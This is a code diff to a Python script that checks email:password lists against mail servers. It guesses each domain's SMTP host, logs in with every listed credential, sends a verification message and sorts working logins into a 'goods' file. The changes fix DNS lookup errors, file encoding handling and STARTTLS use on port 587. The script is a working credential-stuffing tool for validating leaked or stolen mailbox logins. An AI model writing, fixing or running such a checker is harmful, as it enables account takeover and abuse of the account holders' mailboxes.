@@ -81,8 +81,12 @@ def bytes_to_mbit(b):
 
 def guess_smtp_server(domain):
 	try:
-		for h in [resolver.resolve(domain, 'MX')[0].exchange.to_text()[0:-1], domain, 'smtp.'+domain, 'mail.'+domain, 'webmail.'+domain, 'mx.'+domain]:
-			for p in [587, 465, 25]:
+		mx_domain = resolver.resolve(domain, 'MX')[0].exchange.to_text()[0:-1]
+	except:
+		mx_domain = domain
+	for h in [mx_domain, domain, 'smtp.'+domain, 'mail.'+domain, 'webmail.'+domain, 'mx.'+domain]:
+		for p in [587, 465, 25]:
+			try:
 				s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 				s.setblocking(0)
 				s.settimeout(1)
@@ -90,8 +94,8 @@ def guess_smtp_server(domain):
 				s.connect((h, p))
 				s.close()
 				return (h, str(p), '%EMAILADDRESS%')
-	except Exception as e:
-		pass
+			except:
+				pass
 	return False
 
 def get_smtp_server(domain):
@@ -108,7 +112,7 @@ def get_smtp_server(domain):
 	return mx_cache[domain]
 
 def get_rand_ip_of_host(host):
-	return random.choice(socket.getaddrinfo(host, 0, 0, 0, proto=socket.IPPROTO_TCP))[4][0]
+	return random.choice(socket.getaddrinfo(host, 0, family=socket.AF_INET, proto=socket.IPPROTO_TCP))[4][0]
 
 def quit(signum, frame):
 	print('\r\n'*2+cyan(bold('Exiting...')))
@@ -120,7 +124,7 @@ def is_valid_email(email):
 def find_email_password_collumnes(list_filename):
 	email_collumn = False
 	password_collumn = False
-	with open(list_filename) as fp:
+	with open(list_filename, 'r', encoding='utf-8', errors='ignore') as fp:
 		for line in fp:
 			line = re.sub('[;,\t| \'"]+', ':', line.lower())
 			email = re.search(r'[\w.+-]+@[\w.-]+\.[a-z]{2,}', line)
@@ -160,15 +164,14 @@ def smtp_connect_and_send(smtp_server, port, template, smtp_user, password):
 	smtp_login = template.replace('%EMAILADDRESS%', smtp_user).replace('%EMAILLOCALPART%', smtp_user.split('@')[0]).replace('%EMAILDOMAIN%', smtp_user.split('@')[1])
 	smtp_class = smtplib.SMTP_SSL if port == '465' else smtplib.SMTP
 	server_obj = smtp_class(smtp_server_ip, port, timeout=5)
-	server_obj.starttls(context=ssl._create_unverified_context())
-	# server_obj.starttls(context=ssl._create_unverified_context()) if port == '587' else False
+	server_obj.starttls(context=ssl._create_unverified_context()) if port == '587' else False
 	server_obj.ehlo()
 	server_obj.login(smtp_login, password)
 	server_obj.sendmail(smtp_user, verify_email, '\n'.join((headers, message.as_string())))
 	server_obj.quit()
 
 def worker_item(jobs_que, results_que):
-	global threads_count, threads_counter, verify_email, goods, no_jobs_left, loop_times, template
+	global threads_count, threads_counter, verify_email, goods, no_jobs_left, loop_times
 	self = threading.current_thread()
 	while True:
 		if mem_usage>90 and threads_counter>threads_count:
@@ -236,7 +239,7 @@ try:
 		exclude_mail_hosts = ','.join((sys.argv[3], bad_mail_servers))
 	except:
 		exclude_mail_hosts = bad_mail_servers
-	start_from_line = int(sys.argv[-1]) if re.match(r'^\d+$', sys.argv[-1]) else 0
+	start_from_line = int(sys.argv[-1]) if re.match(r'^[\d]+$', sys.argv[-1]) else 0
 except:
 	exit(f'usage: \npython3 {sys.argv[0]} '+bold('list.txt verify_email@example.com')+' [exclude,mail,hosts] [start_from_line]')
 
@@ -253,7 +256,6 @@ no_jobs_left = False
 loop_times = []
 loop_time = 0
 progress = start_from_line
-template = '%EMAILADDRESS%'
 global_status = ''
 email_collumn, password_collumn = find_email_password_collumnes(list_filename)
 total_lines = wc_count(list_filename)
@@ -265,7 +267,7 @@ print(f'goods filename: {bold(smtp_filename)}')
 print(f'bads & report filename: {bold(errors_filename)}')
 input('press '+bold('[ Enter ]')+' to start...')
 
-with open(list_filename, 'r', encoding='utf-8') as fp:
+with open(list_filename, 'r', encoding='utf-8', errors='ignore') as fp:
 	threading.Thread(target=every_second, daemon=True).start()
 	for i in range(start_from_line):
 		line = fp.readline()
